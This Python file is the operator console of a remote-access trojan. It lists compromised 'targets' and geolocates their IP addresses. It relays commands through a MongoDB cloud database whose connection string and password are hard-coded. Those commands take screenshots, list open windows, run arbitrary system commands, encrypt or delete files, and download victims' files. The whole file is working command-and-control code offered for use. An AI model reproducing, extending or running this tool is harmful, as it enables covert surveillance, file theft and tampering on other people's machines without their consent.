import pymongo
import json
from PIL import Image as im
import numpy as np
import requests
from colorama import Fore,init,Style
import os
import socket
import gridfs

MY_FAV_ROOT=f'C:\\Users\\{os.getlogin()}\Desktop'
MY_FAV_FOLDER='ShellUtsav'

init(autoreset=True)


con = "mongodb+srv://utsav:utsav@cluster0.rqeuq69.mongodb.net/?retryWrites=true&w=majority"

client = pymongo.MongoClient(con,tls=True,tlsAllowInvalidCertificates=True)

db=client['shell']

fs=gridfs.GridFS(db)

MY_COMMANDS=['targetlist','shifttarget','exit','e','quit','q','commands','dir','cd','cd..','deletefile','createfile','snap','renamefile','getfile','showimg','mkdir','rmdir','activewindows','getfilesize','updatefile','disks','encrypt','decrypt','targetinfo','getalltypefiles','refreshserver','system']

CWD=r""
LAST_PATH=""
TARGET=""
IP=""
PUBLIC_IP=""
PREV_COMMAND=""
SHELL_RESULT=False
FILENAME=""

hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)

def has_active_internet():
    if IPAddr=="127.0.0.1":
        return False
    else:
        return True

def targetInfo():
    global PUBLIC_IP
    if PUBLIC_IP:
        response = requests.get(f'http://ip-api.com/json/{PUBLIC_IP}').json()
        try:
            city=response.get("city")
            region=response.get("regionName")
            country=response.get("country")
            public_ip=PUBLIC_IP
            lat=response.get("lat")
            lon=response.get("lon")
            isp=response.get('isp')
            location_data =[
            f"Public_IP --> {public_ip}",
            f"city --> {city}",
            f"region --> {region}" ,
            f"country --> {country}",
            f"Latitude --> {lat}",
            f"Longitude --> {lon}",
            f"Internet Service Provider --> {isp}"
            ]
            print(Fore.CYAN+">>> ")
            for i in location_data:
                print(i)
            print()
        except:
            print(Fore.CYAN+">>> ")
            print("Something went wrong!!!")
    else:
        print(Fore.CYAN+">>> ")
        print("No Public IP Found!!!")
        
def getAllTargets():
    col=db['systemInfo']
    res=col.find()
    print()
    print("TARGETS: ")
    print()
    print("\t| Hostname |\tIP")
    print("\t-----------------------------")
    for i in res:
        print(f"\t| {i['hostname']} |\t{i['ip']}")
        print("\t-----------------------------") 
    print()

def getTargetMachine(target=""):
    global TARGET,IP,PUBLIC_IP,CWD,PREV_COMMAND
    col=db['systemInfo']
    if target=="":
        x=col.find_one()
        if x:
            TARGET=x['hostname']
            IP=x['ip']
            PUBLIC_IP=x['public_ip']
            CWD=""
            PREV_COMMAND=""
            return x['hostname'],x['ip']
        else:
            TARGET='None'
            IP='None'
    else:
        filters={
            "hostname":target
        }
        x=col.find_one(filter=filters)
        if x:
            TARGET=x['hostname']
            IP=x['ip']
            PUBLIC_IP=x['public_ip']
            CWD=""
            PREV_COMMAND=""
            return x['hostname'],x['ip']
        else:
            TARGET='None'
            IP='None'

def systemCommandsHandeler():
    global PREV_COMMAND,CWD,TARGET
    a=PREV_COMMAND.split(" ")
    count=0
    new_cmd=""
    col=db['myshell']
    for i in a:
        count+=1
        if i=='system':
            continue
        else:
            if count==len(a):
                new_cmd+=i+" "+"|"+" "+"clip"
            else:
                new_cmd+=i+" "
    data={
        "action":new_cmd,
        "target":TARGET,
        "current_path":CWD,
        "target_string":"",
        "target_element":"",
        "new_filename":"",
        "is_systemCommand":1
        }
    try:
        if not (col.find_one()):
            col.insert_one(data)
            result_for_systemCommand()
        else:
            filters={
                "target":TARGET
                }
            col.delete_one(filters)
            col.insert_one(data)
            result_for_systemCommand()
    except Exception as e:
                print(e)


def result_for_systemCommand():
    col=db['shellresult']
    filters={
            "hostname":TARGET
        }
    while True:
        try:
            listen=col.find_one(filter=filters)
            if listen['result'] and listen['hostname']:
                print(Fore.CYAN+">>> ")
                print(listen['result'])
                break
            elif listen['result']=="" and listen['hostname']:
                break
        except:
            pass



def operation():
    global CWD
    leng=len(CWD)-1
    arr=[]
    while leng>=1:
       arr.append(leng)
       if CWD[leng]=='\\':
            break
       leng=leng-1 
    strr=""
    arr=sorted(arr)    
    for i in arr:
        strr=strr+CWD[i]
    CWD=CWD.replace(strr,"")
    if CWD in ['C:','D:','E:','F:','G:','H:']:
        CWD=CWD+'\\'

def clearCollection():
    global TARGET
    col=db['myshell']
    col2=db['shellresult']
    filters={
        "target":TARGET
    }
    another_filer={
        "hostname":TARGET
    }
    try:
        col.delete_many(filters)
        col2.delete_one(another_filer)
        list_coll=db.list_collection_names()
        for i in list_coll:
            if i=='fs.files':
                col=db['fs.files']
                col.drop()
            if i=='fs.chunks':
                coll=db['fs.chunks']
                coll.drop()
    except Exception as e:
        print(e)


def binaryContent():
    global MY_FAV_ROOT,MY_FAV_FOLDER,FILENAME
    if not (os.path.exists(MY_FAV_ROOT+f"\{MY_FAV_FOLDER}")):
        os.mkdir(MY_FAV_ROOT+f"\{MY_FAV_FOLDER}")
    while True:
        data=db.fs.files.find_one({'filename':FILENAME})
        if data:
            try:
                my_id=data['_id']
                output=fs.get(my_id).read()
                download_location=MY_FAV_ROOT+f"\{MY_FAV_FOLDER}\\"+FILENAME
                out=open(download_location,'wb')
                out.write(output)
                out.close()
                list_coll=db.list_collection_names()
                for i in list_coll:
                    if i=='fs.files':
                        col=db['fs.files']
                        col.drop()
                    if i=='fs.chunks':
                        coll=db['fs.chunks']
                        coll.drop()
                break
            except:
                pass
    

def imageShow():
    col=db['shellresult']
    filters={
            "hostname":TARGET
        }
    while True:
        res=col.find_one(filters)
        if res:
            arry = np.array(res['result'])
            data = im.fromarray(arry.astype('uint8'))
            data.show()
            clearCollection()
            break


def is_directory_change_command():
    global PREV_COMMAND
    global CWD
    global LAST_PATH
    a= (PREV_COMMAND.split(" "))

    if a[0]=='cd':
        if a[1] in ['C:\\','D:\\','E:\\','F:\\','G:\\','H:\\']:
            CWD=a[1]
            PREV_COMMAND=a[1]
        if (a[1])[0]=='\\':
            print(Fore.CYAN+">>> ")
            print("invalid navigate")
        else:
            if CWD and CWD[len(CWD)-1]!='\\':
                a[1]='\\'+a[1]
            CWD=CWD+f'{a[1]}'
            LAST_PATH=f'{a[1]}'
    elif a[0]=='cd..':
            operation()


def ActionUploader():
    global PREV_COMMAND,CWD,MY_COMMANDS,FILENAME
    a= (PREV_COMMAND.split(" "))
    col=db['myshell']
    clearCollection()

    if ((a[0] not in (MY_COMMANDS))):
        print(Fore.CYAN+">>> ")
        print("invalid command")
        return
    

    if a[0]=='commands' and len(a)==1:
        print(Fore.CYAN+">>> ")
        for i in MY_COMMANDS:
            print(i)
        print()

    elif a[0]=='showimg' and len(a)==2:
        target_element=a[1]
        data={
                "action":a[0],
                "target":TARGET,
                "current_path":CWD,
                "target_element":a[1],
                "new_filename":"",
                "target_string":"",
                "is_systemCommand":0
                }
        try:
                if not (col.find_one()):
                    col.insert_one(data)
                    imageShow()
                else:
                    filters={
                        "target":TARGET
                        }
                    col.delete_one(filters)
                    col.insert_one(data)
                    imageShow()
        except Exception as e:
                print(e)

    elif a[0]=='snap' and len(a)==1:
            data={
                "action":a[0],
                "target":TARGET,
                "current_path":CWD,
                "target_element":"",
                "new_filename":"",
                "target_string":"",
                "is_systemCommand":0
                }
            try:
                if not (col.find_one()):
                    col.insert_one(data)
                    imageShow()
                else:
                    filters={
                        "target":TARGET
                        }
                    col.delete_one(filters)
                    col.insert_one(data)
                    imageShow()
            except Exception as e:
                    print(e)

    elif a[0]=='getfilesize' and len(a)==2:
        target_element=a[1]
        data={
                "action":a[0],
                "target":TARGET,
                "current_path":CWD,
                "target_element":a[1],
                "new_filename":"",
                "target_string":"",
                "is_systemCommand":0
                }
        try:
                if not (col.find_one()):
                    col.insert_one(data)
                    
                    try:
                        col=db['shellresult']
                        filters={
                            "hostname":TARGET
                        }
                        while True:
                            res=col.find_one(filters)
                            if res:
                                print(Fore.CYAN+">>> ")
                                print(Fore.CYAN+f"{res['result']} MB")
                                break
                    except Exception as e:
                        print(e)
                else:
                    filters={
                        "target":TARGET
                        }
                    col.delete_one(filters)
                    col.insert_one(data)
                    try:
                        col=db['shellresult']
                        filters={
                            "hostname":TARGET
                        }
                        while True:
                            res=col.find_one(filters)
                            if res:
                                print(Fore.CYAN+">>> ")
                                print(Fore.CYAN+f"{res['result']} MB")
                                break
                    except Exception as e:
                        print(e)
        except Exception as e:
                print(e)

    elif a[0]=='activewindows' and len(a)==1:
            data={
                "action":a[0],
                "target":TARGET,
                "current_path":CWD,
                "target_element":"",
                "new_filename":"",
                "target_string":"",
                "is_systemCommand":0
                }
            try:
                if not (col.find_one()):
                    col.insert_one(data)
                    try:
                        col=db['shellresult']
                        filters={
                            "hostname":TARGET
                        }
                        while True:
                            res=col.find_one(filters)
                            if res:
                                print(Fore.CYAN+">>> ")
                                for i in res['result']:
                                    print(i)
                                break
                    except Exception as e:
                        print(e)
                else:
                    filters={
                        "target":TARGET
                        }
                    col.delete_one(filters)
                    col.insert_one(data)
                    try:
                        col=db['shellresult']
                        filters={
                            "hostname":TARGET
                        }
                        while True:
                            res=col.find_one(filters)
                            if res:
                                print(Fore.CYAN+">>> ")
                                for i in res['result']:
                                    print(i)
                                break
                    except Exception as e:
                        print(e)
            except Exception as e:
                    print(e)
        
    elif a[0]=='targetinfo' and len(a)==1:
        targetInfo()
    elif a[0]=='refreshserver' and len(a)==1:
        clearCollection()
        CWD=""
        PREV_COMMAND=""
    
    elif a[0]=='system':
        systemCommandsHandeler()
    elif a[0]=='targetlist' and len(a)==1:
        getAllTargets()
    elif a[0]=='shifttarget' and len(a)==2:
        getTargetMachine(target=a[1])

    elif a[0]=='getalltypefiles' and len(a)==2:
        target_element=a[1]
        FILENAME=a[1]
        data={
                "action":a[0],
                "target":TARGET,
                "current_path":CWD,
                "target_element":a[1],
                "new_filename":"",
                "target_string":"",
                "is_systemCommand":0
                }
        try:
            if not (col.find_one()):
                col.insert_one(data)
                binaryContent()
            else:
                filters={
                    "target":TARGET
                    }
                col.delete_one(filters)
                col.insert_one(data)
                binaryContent()
        except Exception as e:
                print(e)
        
    
    else:
        if a[0] not in ['cd','cd..','exit','e','quit','q','commands']:
            action=a[0]
            current_path=CWD
            target=TARGET
            if len(a)==2:
                target_element=a[1]
                data={
                "action":action,
                "target":target,
                "current_path":current_path,
                "target_element":target_element,
                "new_filename":"",
                "target_string":"",
                "is_systemCommand":0
                }
            elif len(a)>=3:
                if a[0]=='updatefile':
                    target_element=a[1]
                    target_string=""
                    for i in range(2,len(a)):
                        target_string=target_string+a[i]+" "
                    data={
                        "action":action,
                        "target":target,
                        "current_path":current_path,
                        "target_element":target_element,
                        "target_string":target_string,
                        "new_filename":"",
                        "is_systemCommand":0
                        }
                elif a[0]=='renamefile':
                    target_element=a[1]
                    new_filename=a[2]
                    data={
                        "action":action,
                        "target":target,
                        "current_path":current_path,
                        "target_element":target_element,
                        "new_filename":new_filename,
                        "target_string":"",
                        "is_systemCommand":0
                        }
            else:
                data={
                "action":action,
                "target":target,
                "current_path":current_path,
                "target_string":"",
                "target_element":"",
                "new_filename":"",
                "is_systemCommand":0
                }
            try:
                if not (col.find_one()):
                    col.insert_one(data)
                    result_for_shell(a[0])
                else:
                    filters={
                        "target":TARGET
                        }
                    col.delete_one(filters)
                    col.insert_one(data)
                    result_for_shell(a[0])
            except Exception as e:
                print(e)


def display(res):
    print(Fore.CYAN+">>> ")
    if(type(json.loads(res['result']))==list):
        for i in (json.loads(res['result'])):
            print(i)
    else:
        print(json.loads(res['result']))
    print()
    clearCollection()


def result_for_shell(command):
    if command not in ['cd','commands','cd..','exit','e','quit','q','deletefile','updatefile','mkdir','rmdir','createfile','renamefile','encrypt','decrypt']:
        col=db['shellresult']
        filters={
            "hostname":TARGET
        }
        while True:
                res=col.find_one(filters)
                if res:
                    display(res)
                    break



def shell():
    global CWD
    global PREV_COMMAND
    global TARGET,IP
    getAllTargets()
    getTargetMachine()
    while True:
        internet=has_active_internet()
        struct0=(Fore.LIGHTYELLOW_EX+f"~\{CWD}")
        struct00=(Fore.MAGENTA+Style.BRIGHT+f"{IP}")
        struct1=(Fore.CYAN+Style.BRIGHT+f"target@{TARGET} {struct00} {struct0}\n")
        struct2=(Fore.MAGENTA+Style.BRIGHT+"$ ")
        shell_struct=struct1+struct2
        command=str(input(shell_struct))
        if internet:
            try:
                PREV_COMMAND=(command)
                is_directory_change_command()
                ActionUploader()
                if command in ['exit','e','quit','q']:
                    clearCollection()
                    break
            except Exception as e:
                print(e)
        else:
            print(">>> ")
            print("You are Offline!!!...")



shell()